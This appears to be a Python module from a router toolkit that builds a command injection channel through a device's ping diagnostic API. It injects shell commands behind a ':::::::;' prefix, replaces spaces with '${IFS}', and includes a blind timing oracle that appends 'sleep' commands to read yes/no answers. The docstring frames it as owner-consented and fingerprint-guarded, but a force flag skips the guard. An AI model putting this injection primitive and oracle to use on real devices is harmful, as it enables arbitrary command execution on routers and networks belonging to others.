"""Ping-diagnostic command injection channel and timing oracle.

Safety properties of this module:
  * requires an authenticated session (physical-button login);
  * refuses to run against unknown device families unless forced
    (firmware fingerprint guard);
  * every privileged action goes through the documented, owner-consented
    ping API only.

As the toolkit grows to support additional devices, device-specific constants
(payload prefix, space substitute, oracle sleep duration, injection service
name) are read from the matched fingerprint's capabilities rather than being
hard-coded here.  The module-level defaults remain the NeXXt One values for
backward compatibility.
"""

from __future__ import annotations

import time

from . import compat
from . import driver as _driver

# Module-level NeXXt One defaults.  These are used when an Injector is created
# without a detected device (e.g. tests or --force on an unknown device).
I = "${IFS}"
ORACLE_SLEEP = 5
PAYLOAD_PREFIX = ":::::::;"
INJECTION_SERVICE = "pingstatus"

# Legacy token tuple, kept for backwards compatibility with any external
# importers; the authoritative fingerprint data now lives in compat.json.
KNOWN_FINGERPRINTS = tuple(
    token for entry in compat.load_compat()
    for token in (entry.get("board", ""), entry.get("model_prefix", ""),
                  entry.get("product_contains", "")) if token)


def run_ping(client, host: str, settle_timeout: float = 45.0,
             poll_interval: float = 1.0,
             service: str = INJECTION_SERVICE,
             reader: str | None = None) -> tuple[float, dict]:
    """Submit a ping request; measure seconds until DiagnosticsState settles.

    ``service`` is the diagnostic endpoint used for injection (historically
    ``pingstatus``).  ``reader`` defaults to ``service + "info"`` and is the
    endpoint polled for completion.
    """
    reader = reader or (service + "info")
    status, data = client.set(service, host=host, state="Requested", name="ping")
    if status != 200:
        return -1.0, {"submit_http": status, "submit_response": data}
    start = time.time()
    last: dict = {}
    while time.time() - start < settle_timeout:
        time.sleep(poll_interval)
        _, data = client.get(reader)
        last = data.get(reader, data)
        state = str(last.get("DiagnosticsState", ""))
        if state and state not in {"Requested", "InProgress", "None"}:
            break
    return time.time() - start, last


class UnknownDeviceError(RuntimeError):
    pass


class Injector:
    """Authenticated injection channel with oracle and fingerprint guard."""

    def __init__(self, client, force: bool = False, dry_run: bool = False,
                 log=print, device: _driver.Device | None = None) -> None:
        self.client = client
        self.log = log
        self.dry_run = dry_run
        self.device = device
        client.require_auth()
        if not force:
            self._guard()
        # If no device was supplied and guard did not run, fall back to the
        # historical NeXXt One defaults.
        if self.device is None:
            self.device = _driver.default_device()
        if dry_run:
            self.base = 2.3
            return
        # Two samples, take the max: a single sample can read low on a lucky
        # fast request and make the oracle threshold too sensitive (verify.py
        # uses the same two-sample-max baseline for the same reason).
        b1, _ = run_ping(self.client, "127.0.0.1",
                         service=self.injection_service,
                         reader=self.injection_reader)
        b2, _ = run_ping(self.client, "127.0.0.1",
                         service=self.injection_service,
                         reader=self.injection_reader)
        self.base = max(b1, b2)

    @property
    def I(self) -> str:
        return self.device.cap("injection", "space_substitute", default=I)

    @property
    def oracle_sleep(self) -> int:
        return self.device.cap("injection", "oracle_sleep", default=ORACLE_SLEEP)

    @property
    def payload_prefix(self) -> str:
        return self.device.cap("injection", "payload_prefix", default=PAYLOAD_PREFIX)

    @property
    def injection_service(self) -> str:
        return self.device.cap("injection", "service", default=INJECTION_SERVICE)

    @property
    def injection_reader(self) -> str:
        return self.injection_service + "info"

    def _guard(self) -> None:
        status, data = self.client.get("sysinfo")
        info = data.get("sysinfo", {}) if status == 200 else {}
        result = compat.match_fingerprint(
            board=str(info.get("hw_version", "")),
            model=str(info.get("model", "")),
            product=str(info.get("model", "")),
            firmware=str(info.get("fw_version", "")))
        if result.status == compat.STATUS_UNKNOWN:
            haystack = " ".join(str(info.get(k, "")) for k in
                                 ("model", "hw_version", "fw_version"))
            raise UnknownDeviceError(
                f"unrecognized device fingerprint {haystack!r}; refusing to "
                "inject. Re-run 'nexxt probe' to check compatibility, or "
                "pass --force if you know what you are doing.")
        if result.status == compat.STATUS_UNTESTED:
            self.log(f"[guard] {result.reason}; proceeding "
                     "(use --force to skip this check entirely)")
        # Bind the matched device so subsequent commands use its capabilities.
        self.device = _driver.detect_from_entry(result.entry)

    def do(self, cmd: str) -> float:
        if self.dry_run:
            self.log(f"[dry-run] would inject: {cmd}")
            return 0.0
        elapsed, _ = run_ping(
            self.client, self.payload_prefix + cmd,
            service=self.injection_service,
            reader=self.injection_reader)
        return elapsed

    def ask(self, cmd: str) -> bool:
        if self.dry_run:
            self.log(f"[dry-run] would oracle: {cmd}")
            return False
        sleep = self.oracle_sleep
        elapsed, _ = run_ping(
            self.client,
            self.payload_prefix + cmd + f"&&sleep{self.I}{sleep}",
            service=self.injection_service,
            reader=self.injection_reader)
        return elapsed > self.base + sleep - 2
